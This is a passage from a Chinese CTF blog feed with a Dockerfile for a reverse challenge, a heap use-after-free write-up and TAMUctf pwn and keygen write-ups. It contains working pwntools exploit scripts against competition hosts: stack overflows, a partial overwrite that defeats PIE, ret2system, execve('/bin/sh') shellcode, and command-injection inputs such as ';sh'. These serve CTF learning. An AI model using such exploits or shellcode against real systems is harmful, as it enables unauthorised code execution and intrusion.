class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu:16.04#该 image 文件继承官方的 ubuntu image，冒号表示标签，即16.04版本的ubuntu</span><br><span class="line"></span><br><span class="line">#RUN命令在创建镜像时被执行</span><br><span class="line"></span><br><span class="line">RUN apt update --fix-missing#更新源</span><br><span class="line">RUN apt install -y socat安装socat网络工具</span><br><span class="line"></span><br><span class="line">RUN groupadd ctf#创建一个新的用户组</span><br><span class="line"></span><br><span class="line">RUN mkdir /rev#在根目录创建一个文件夹</span><br><span class="line"></span><br><span class="line">#COPY命令将Dockerfile所在文件夹的指定文件复制到镜像中的指定位置</span><br><span class="line"></span><br><span class="line">COPY simple /rev/simple</span><br><span class="line">COPY flag.txt /rev/flag.txt</span><br><span class="line"></span><br><span class="line">RUN useradd -G ctf --home=/rev revuser</span><br><span class="line">RUN useradd -G ctf --home=/rev revflag#添加属于ctf组的用户</span><br><span class="line"></span><br><span class="line">RUN chown revflag:revflag /rev/flag.txt</span><br><span class="line">RUN chown revflag:revflag /rev/simple#设置文件拥有者</span><br><span class="line"></span><br><span class="line">RUN chmod 4755 /rev/simple#可执行权限设置为s</span><br><span class="line">RUN chmod 444 /rev/flag.txt</span><br><span class="line"></span><br><span class="line">EXPOSE 7223#开放7223端口</span><br><span class="line"></span><br><span class="line">#CMD命令在容器运行时执行，并且一个Dockerfile只能有一个CMD命令</span><br><span class="line"></span><br><span class="line">CMD [&quot;su&quot;, &quot;-c&quot;, &quot;exec socat TCP-LISTEN:7223,reuseaddr,fork EXEC:/rev/simple,stderr&quot;, &quot;-&quot;, &quot;revuser&quot;]</span><br><span class="line"></span><br><span class="line">#TCP4-LISTEN在本地建立的是一个TCP ipv4协议的监听端口</span><br><span class="line">#reuseaddr绑定本地一个端口</span><br><span class="line">#fork设定多链接模式，即当一个链接被建立后，自动复制一个同样的端口再进行监听</span><br></pre></td></tr></table></figure><h1 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h1><h2 id="创建image"><a href="#创建image" class="headerlink" title="创建image"></a>创建image</h2><hr><p>把Dockerfile需要的文件放在Dockerfile所在文件夹内。</p><p><code>docker image build -t [imageName]:[tag] .</code><br>使用上面命令创建image文件，<code>-t</code>用于指定image的名字，tag可选。</p><p>如：</p><p><code>docker image build -t advkeygen .</code></p><h2 id="生成容器"><a href="#生成容器" class="headerlink" title="生成容器"></a>生成容器</h2><hr><p><code>docker container run -p 8000:7223 -it --rm advkeygen</code></p><p>这个命令令从advkeygen镜像生成一个容器</p><p><code>-p</code>用来指明映射端口，上述命令将本地8000端口映射到容器的7223端口。若使用<code>-P</code>参数则会由系统自动分配端口，可以使用<code>docker container ls</code>查看具体映射的端口。</p><p><code>-it</code>容器的shell映射到当前shell，本机窗口输入的命令会传入容器。</p><p><code>--rm</code>参数在容器停止运行后自动删除容器。</p><p><img src="https://i.imgur.com/Gb1zsfF.png" alt=""></p><h1 id="发布image"><a href="#发布image" class="headerlink" title="发布image"></a>发布image</h1><p>确定容器可以运行之后就可以发布到网上，方便随时取用。</p><p>官网：<strong><a href="hub.docker.com">hub.docker.com</a></strong></p><p>注册后用命令<code>docker login</code>登录。</p><p><code>docker image tag [imgeName] [username]/[repository]:[tag]</code></p><p>然后给要上传的image标注用户名(就是docker账号的用户名)和版本。tag可选。</p><p>如：</p><p><code>docker image tag advkeygen muirelle/advkeygen</code></p><p>接着重构image文件：</p><p><code>docker image build -t [username]/[repository]:[tag] .</code></p><p>最后发布image文件:</p><p><code>docker image push [username]/[repository]:[tag]</code></p><p>发布完成后可以在官网登录账号查看自己的image</p><p>用命令</p><p><code>docker image pull muirelle/advkeygen</code></p><p>就可以在其他设备拉取到之前上传的镜像了。</p><p>:)</p>]]></content>
      
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安恒杯2019二月-pwn</title>
      <link href="/2019/03/02/%E5%AE%89%E6%81%92%E6%9D%AF2019%E4%BA%8C%E6%9C%88-pwn/"/>
      <url>/2019/03/02/%E5%AE%89%E6%81%92%E6%9D%AF2019%E4%BA%8C%E6%9C%88-pwn/</url>
      
        <content type="html"><![CDATA[<p>考点比较单一，读懂每个函数都做了什么，加上uaf的一点知识就能做了。如果开启了pie应该是用来练习绕过pie的很好的一道题。</p><a id="more"></a><h1 id="hackmoon"><a href="#hackmoon" class="headerlink" title="hackmoon"></a>hackmoon</h1><p><strong><a href="https://xpro-adl.91ctf.com/userdownload?filename=5c6cb469e9a76.zip&amp;type=attach&amp;feature=custom" target="_blank" rel="noopener">https://xpro-adl.91ctf.com/userdownload?filename=5c6cb469e9a76.zip&amp;type=attach&amp;feature=custom</a></strong></p><p><img src="https://i.imgur.com/NcN0DRk.png" alt=""><br>查看保护</p><p><img src="https://i.imgur.com/ERdPxAR.png" alt=""><br>主函数，圈出来的三个函数是整个程序的主要功能</p><p>逐个分析：</p><h2 id="add-moon"><a href="#add-moon" class="headerlink" title="add_moon"></a>add_moon</h2><p><img src="https://i.imgur.com/fJkGpyY.png" alt=""><br>moonlist是指向bss段的指针，一个指针为4字节。</p><p>从下标0到4依次判断moonlist[i]是否为0，若为零则代表该指针为空，继续进行分配空间的操作。</p><p>首先将moonlist[i]指向新申请的8字节heap空间中（设为chunk_A），然后<em>(_DWORD </em>)moonlist[i] = print_moon_content;将函数print_moon_content()的地址放在chunk_A的前4字节中。</p><p>接着从键盘读取8字节输入，转成int存于变量size中。<br>v0 = moonlist[i]令指针v0等于moonlist[i]，所以v0也指向chunk_A。</p><p>v0[1] = malloc(size);直接看不容易理解，配合反汇编的代码可以很容易理解：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>0804874E<span class="keyword">mov</span><span class="built_in">ebx</span>, <span class="built_in">ds</span>:moonlist[<span class="built_in">eax</span>*<span class="number">4</span>]</span><br><span class="line">   .</span><br><span class="line">   .</span><br><span class="line">   .</span><br><span class="line"><span class="symbol">.text:</span>0804875C<span class="keyword">call</span>_malloc</span><br><span class="line"><span class="symbol">.text:</span><span class="number">08048761</span><span class="keyword">add</span><span class="built_in">esp</span>, <span class="number">10h</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">08048764</span><span class="keyword">mov</span>[<span class="built_in">ebx</span>+<span class="number">4</span>], <span class="built_in">eax</span></span><br></pre></td></tr></table></figure><p>先在chunk_A后面malloc一个size大小的chunk(设为chunk_B)，再将指向chunk_B的指针返回给eax，并赋给[ebx+4]，也就是[moonlist[i]+4]，也就是*(moonlist[i]+4)，所以用户申请的空间chunk_B的地址其实存放于chunk_A的后4字节。总结：moonlist[i]指向chunk_A，chunk_A前四字节指向print_moon_content()，后四字节指向chunk_B。chunk_B存放用户输入的数据。</p><p><img src="https://i.imgur.com/fmifmL5.png" alt=""></p><p>最后从用户读取size大小的数据存放于chunk_B中。count递增1。</p><h2 id="print-moon"><a href="#print-moon" class="headerlink" title="print_moon"></a>print_moon</h2><p><img src="https://i.imgur.com/AJVN1Vg.png" alt=""></p><p>从键盘输入要打印的内容的下标转int后赋值给v1。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( moonlist[v1] )</span><br><span class="line">(*(<span class="keyword">void</span> (__cdecl **)(<span class="keyword">void</span> *))moonlist[v1])(moonlist[v1]);</span><br></pre></td></tr></table></figure><p>随后调用打印函数就只有这一句话，看上去很难理解，所以还是回到反汇编：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">08048945</span>                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+var_14]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">08048948</span>                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:moonlist[<span class="built_in">eax</span>*<span class="number">4</span>]</span><br><span class="line"><span class="symbol">.text:</span>0804894F                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">08048951</span>                 <span class="keyword">jz</span>      short loc_8048972#判断v1是否超出范围</span><br><span class="line"><span class="symbol">.text:</span><span class="number">08048953</span>                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+var_14]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">08048956</span>                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:moonlist[<span class="built_in">eax</span>*<span class="number">4</span>]#此时<span class="built_in">eax</span>=moonlist[i]，所以<span class="built_in">eax</span>指向chunk_A</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0804895D</span>                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">eax</span>]</span><br><span class="line"></span><br><span class="line">#[<span class="built_in">eax</span>]取chunk_A中的值也就是print_moon_content()的地址，再赋给<span class="built_in">eax</span>。此时<span class="built_in">eax</span>指向print_moon_content()</span><br><span class="line"></span><br><span class="line"><span class="symbol">.text:</span>0804895F                 <span class="keyword">mov</span>     <span class="built_in">edx</span>, [<span class="built_in">ebp</span>+var_14]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">08048962</span>                 <span class="keyword">mov</span>     <span class="built_in">edx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:moonlist[<span class="built_in">edx</span>*<span class="number">4</span>]#将<span class="built_in">edx</span>也指向chunk_A。</span><br><span class="line"><span class="symbol">.text:</span><span class="number">08048969</span>                 <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">0Ch</span></span><br><span class="line"><span class="symbol">.text:</span>0804896C                 <span class="keyword">push</span>    <span class="built_in">edx</span>#<span class="built_in">edx</span>压栈，作为参数传递。</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0804896D</span>                 <span class="keyword">call</span>    <span class="built_in">eax</span>#此时调用print_moon_content()，chunk_A地址作为参数。</span><br><span class="line"><span class="symbol">.text:</span>0804896F                 <span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">10h</span></span><br></pre></td></tr></table></figure><h3 id="print-moon-content"><a href="#print-moon-content" class="headerlink" title="print_moon_content"></a>print_moon_content</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">print_moon_content</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(*(<span class="keyword">const</span> <span class="keyword">char</span> **)(a1 + <span class="number">4</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>a1为指针，打印a1+4后的内容。也就是chunk_B，用户输入的内容。</p><h2 id="del-moon"><a href="#del-moon" class="headerlink" title="del_moon"></a>del_moon</h2><p><img src="https://i.imgur.com/pOTxNuX.png" alt=""></p><p>读取下标。<br>先free掉chunk_B再free掉chunk_A。</p><h2 id="uaf"><a href="#uaf" class="headerlink" title="uaf"></a>uaf</h2><p><img src="https://i.imgur.com/2hA6Ead.png" alt=""><br>发现<code>magic</code>函数，目标就是调用它。</p><p>函数分析完了大致也知道是一个uaf的漏洞了，一开始想复杂了还在到处找溢出点，后面发现直接就是一个纯粹的uaf。。</p><p>思路：<strong>调用两次add_moon，得到moonlist[0],moonlist[1] (大小随意，不要太大，而且不能是8字节。内容随意)，再free掉这两个moon，再调用一次add_moon（大小为8字节，内容是<code>magic</code>的地址)，最后打印moonlist[1]</strong></p><p>解释：<strong>因为每调用依次add_moon就会malloc两个chunk，而且有一个是固定的8字节大小。所以add_moon两次再free两次就会出现4个free chunk存放在fastbin中，两个8字节大小，两个自定大小。当再次add_moon一个8字节大小的moon时，fastbin就会把刚才的两个8字节chunk分配给我们。而由于第二个8字节chunk是内容可控的，同时这个chunk还是moonlist[1]的头部(也就是8字节部分)，此时用<code>magic</code>的地址替换掉原来<code>print_moon_content</code>的地址，再调用print_moon打印moonlist[1]，调用<code>magic</code>函数。(如果最开始申请的两个moon大小为8字节就没办法控制另一个moon的头部信息了，所以一定不能是8字节)</strong></p><p>第一次申请后：<br><img src="https://i.imgur.com/wtlaZgZ.png" alt=""></p><p>最后期待的heap内容应该是这样：<br><img src="https://i.imgur.com/LmYbyNK.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'101.71.29.5'</span>,<span class="number">10013</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choose</span><span class="params">(i)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> (r.recvuntil(<span class="string">'Your choice :'</span>))</span><br><span class="line">    r.sendline(str(i))</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_moon</span><span class="params">(size, s)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> (r.recvuntil(<span class="string">'moon size :'</span>))</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    <span class="keyword">print</span> (r.recvuntil(<span class="string">'Content :'</span>))</span><br><span class="line">    r.sendline(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_moon</span><span class="params">(index)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> (r.recvuntil(<span class="string">'Index :'</span>))</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_moon</span><span class="params">(index)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> (r.recvuntil(<span class="string">'Index :'</span>))</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line"></span><br><span class="line">choose(<span class="number">1</span>)</span><br><span class="line">add_moon(<span class="number">0x10</span>, <span class="string">'AAAA'</span>)</span><br><span class="line">choose(<span class="number">1</span>)</span><br><span class="line">add_moon(<span class="number">0x10</span>, <span class="string">'BBBB'</span>)</span><br><span class="line">choose(<span class="number">2</span>)</span><br><span class="line">del_moon(<span class="number">1</span>)</span><br><span class="line">choose(<span class="number">2</span>)</span><br><span class="line">del_moon(<span class="number">0</span>)</span><br><span class="line">choose(<span class="number">1</span>)</span><br><span class="line">add_moon(<span class="number">0x8</span>, p32(magic))</span><br><span class="line">choose(<span class="number">3</span>)</span><br><span class="line">print_moon(<span class="number">1</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TAMUctf</title>
      <link href="/2019/03/01/TAMUctf/"/>
      <url>/2019/03/01/TAMUctf/</url>
      
        <content type="html"><![CDATA[<p>摸鱼，做题。</p><p>捡了几道简单的pwn题做，剩下的真做不出来，等着收一波大佬的wp</p><a id="more"></a><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p>题目：<strong><a href="https://tamuctf.com/files/b804e1ab7d43ff479292094d9ec64526/pwn1" target="_blank" rel="noopener">https://tamuctf.com/files/b804e1ab7d43ff479292094d9ec64526/pwn1</a></strong></p><p><img src="https://i.imgur.com/SQIi0yj.png" alt=""></p><p>找偏移覆盖v5的值即可</p><p><img src="https://i.imgur.com/xQJCqGz.png" alt=""><br>通过padding找到偏移</p><p>最后脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'pwn.tamuctf.com'</span>,<span class="number">4321</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (r.recv())</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">'Sir Lancelot of Camelot'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (r.recv())</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">'To seek the Holy Grail.'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (r.recv())</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">'AAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK'</span>+p32(<span class="number">0xdea110c8</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (r.recv())</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>有个疑问，不知道为什么最后加了interactive才出flag，理论上应该直接出的，想不通。</p><h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><p>题目：<strong><a href="https://tamuctf.com/files/fe3b76a986798016f0b868da03a56c79/pwn2" target="_blank" rel="noopener">https://tamuctf.com/files/fe3b76a986798016f0b868da03a56c79/pwn2</a></strong></p><p><img src="https://i.imgur.com/yRHY3j9.png" alt=""><br>开的保护蛮多的</p><p><img src="https://i.imgur.com/ntMOBrQ.png" alt=""><br>gets读取用户输入</p><p><img src="https://i.imgur.com/1TKyhPl.png" alt=""><br>将长度最大为0x1f的数据复制到dest所指向的位置。如果dest所指字符串为’one’则调用函数<code>one</code>。整个函数流程差不多就这样。</p><p>这个return v3()很诱人啊，于是想把v3覆盖成函数<code>print_flag()</code>的地址。但是注意到源程序开了pie保护，没办法直接拿到<code>print_flag()</code>的地址。</p><p>注意观察一下dest和v3在栈上的位置，dest在ebp-0x2a。0x2a减去最大能输入的字符串长度0x1f等于0xb，而v3在ebp-0xc，也就是说v3的最后一个字节是可以被覆盖到的。</p><p>google了一下，知道了pie不会随机化地址的低12位。</p><p>利用这个特性，再加上发现<code>two</code>距离<code>print_flag()</code>很近，所以只需要把<code>two</code>地址的最后一个字节覆盖成<code>print_flag()</code>地址的最后一个字节就可以成功调用<code>print_flag()</code>函数了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'pwn.tamuctf.com'</span>,<span class="number">4322</span>)</span><br><span class="line"></span><br><span class="line">print(r.recv())</span><br><span class="line"></span><br><span class="line">s = <span class="string">'aa'</span> + <span class="string">'a'</span>*<span class="number">4</span>*<span class="number">7</span> + <span class="string">'\xdc'</span></span><br><span class="line"></span><br><span class="line">r.sendline(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (r.recv())</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>同样也是加了interactive才能拿flag，有点奇怪。</p><h2 id="pwn5"><a href="#pwn5" class="headerlink" title="pwn5"></a>pwn5</h2><p>题目：<strong><a href="https://tamuctf.com/files/faf489a3ffea904aba9fea47647584b8/pwn5" target="_blank" rel="noopener">https://tamuctf.com/files/faf489a3ffea904aba9fea47647584b8/pwn5</a></strong></p><p>pwn4都不需要dump文件下来，连服务器直接做，在discord里面被大佬一通嘲笑2333。</p><p>pwn5就是pwn4的升级版，限定了可输入命令的长度为4，导致没办法像pwn4那样直接<code>.;cat flag.txt</code>就可以拿flag那么简单了。</p><p><img src="https://i.imgur.com/RDsSxHS.png" alt=""><br>没开pie，挺好的。（好像患上了pie恐惧症）</p><p><img src="https://i.imgur.com/ouowepD.png" alt=""><br>main函数里就只有一个<code>laas()</code>函数。读取不带反斜杠的字符串。</p><p><img src="https://i.imgur.com/XAENc0M.png" alt=""><br>函数<code>run_cmd</code>中直接调用了system，但是貌似不能直接在这个函数里搞事情，因为v2的长度被限制死了。</p><p>但是别忘了<code>laas()</code>里用了gets而且没开canary保护，所以直接覆盖返回值为system吧。。</p><p><img src="https://i.imgur.com/Liivdiy.png" alt=""><br>先找到’/bin/sh’的位置<strong>0x080bc140</strong></p><p>再找到system的地址：<strong>0x804ee30</strong></p><p>然后计算偏移：s位于ebp+0xd，所以ret位于0xd+0x4=0x11</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'pwn.tamuctf.com'</span>,<span class="number">4325</span>)</span><br><span class="line"></span><br><span class="line">print(r.recv())</span><br><span class="line"></span><br><span class="line">s = <span class="string">'a'</span>*<span class="number">0x11</span> + p32(<span class="number">0x804ee30</span>) + <span class="string">'aaaa'</span> + p32(<span class="number">0x080bc140</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (r.recv())</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>补充:看过wp后发现还是想复杂了。。。也是直接连服务器就能做。忘了ls可以不用加参数，所以连上服务器然后<code>;sh</code>完事。。。</p><h2 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h2><p>题目：<strong><a href="https://tamuctf.com/files/9dc4f5b5523625eb82f2d0de5e16291a/pwn3" target="_blank" rel="noopener">https://tamuctf.com/files/9dc4f5b5523625eb82f2d0de5e16291a/pwn3</a></strong></p><p>很简单的一道题结果最后才做出来。。。</p><p><img src="https://i.imgur.com/Eg48enC.png" alt=""><br>没开canary和nx</p><p><img src="https://i.imgur.com/jJBBxVg.png" alt=""><br>整个程序就只有这么一点，泄露了s处的栈地址。</p><p>一直在想怎么怎么泄露libc的基址好绕过pie，然而最简单的覆盖ret劫持流程加shellcode的组合却忘了(´_ゝ`)。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'pwn.tamuctf.com'</span>,<span class="number">4323</span>)</span><br><span class="line"></span><br><span class="line">print(r.recvuntil(<span class="string">'Take this, you might need it on your journey '</span>))</span><br><span class="line"></span><br><span class="line">leak_stack = int(r.recvuntil(<span class="string">'!'</span>)[<span class="number">2</span>:<span class="number">-1</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">print(leak_stack)</span><br><span class="line"></span><br><span class="line">x = <span class="number">0x12a</span><span class="comment">#  #</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'</span></span><br><span class="line">payload = shellcode + <span class="string">'a'</span>*(x-len(shellcode)) + <span class="string">'aaaa'</span> + p32(leak_stack)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="keygenme"><a href="#keygenme" class="headerlink" title="keygenme"></a>keygenme</h2><p>docker环境<strong><code>docker pull muirelle/advkeygen:latest</code></strong></p><p>到最后也没拿到这道题flag，反向验证没问题，一直不知道那里出错了，甚至最后开始怀疑起了服务器。</p><p>看了wp才知道是多了一个字节。分析一波原因。</p><p><img src="https://i.imgur.com/01juQCt.png" alt=""></p><p><img src="https://i.imgur.com/YOmtcay.png" alt=""></p><p><img src="https://i.imgur.com/ECQlpCq.png" alt=""></p><p>整个程序的流程大致如下：</p><p>读取用户输入字符串a1，限制长度在0x9到0x40之间。</p><p>经过<code>enc()</code>对a1每一字节的各种运算，最后返回被修改后的a1，再与字符串<code>[OIonU2_&lt;__nK&lt;KsK</code>作比较，相等的话就输出flag。</p><p>有个坑点，一不注意就会掉进去，就是换行符的问题。</p><p>由于一开始没有注意到程序中用了fgets来读取输入(fgets会读取换行符并在后面加上空字符，而gets会将换行符直接替换为空字符)，所以最后生成的字符串<code>[OIonU2_&lt;__nK&lt;KsK</code>的最后一个字节就是由换行符生成的。所以a1的长度其实只有上面那个字符串的长度-1，因为换行符会占一字节。</p><p>当时还专门写了一段c去正向测试是否能输出<code>[OIonU2_&lt;__nK&lt;KsK</code>，结果是可以正确输出的，但是没有意识到自己用的是scanf读取输入，所以导致strlen获取长度时少读取了一个换行符的长度，就一直没做出来。。。</p><p>最后解题脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">v5=<span class="string">'[OIonU2_&lt;__nK&lt;KsK'</span></span><br><span class="line"></span><br><span class="line">ans=<span class="string">''</span></span><br><span class="line">ans2 = <span class="string">''</span></span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(v5)<span class="number">-1</span>):<span class="comment">#就是因为这里少了一个-1</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">if</span>(i == <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">if</span> ((((j + <span class="number">12</span>) * <span class="number">72</span> + <span class="number">17</span>) % <span class="number">70</span> + <span class="number">48</span>) == ord(v5[i])):</span><br><span class="line">                ans+=chr(j)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> ((((j + <span class="number">12</span>) * ord(v5[i<span class="number">-1</span>]) + <span class="number">17</span>) % <span class="number">70</span> + <span class="number">48</span>) == ord(v5[i])):</span><br><span class="line">                ans+=chr(j)</span><br><span class="line">    ans2+=ans[len(ans)<span class="number">-1</span>]</span><br><span class="line">    <span class="comment">#print (ans)</span></span><br><span class="line">    ans=<span class="string">''</span></span><br><span class="line"></span><br><span class="line">print(ans2)</span><br></pre></td></tr></table></figure><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="RSAaaay"><a href="#RSAaaay" class="headerlink" 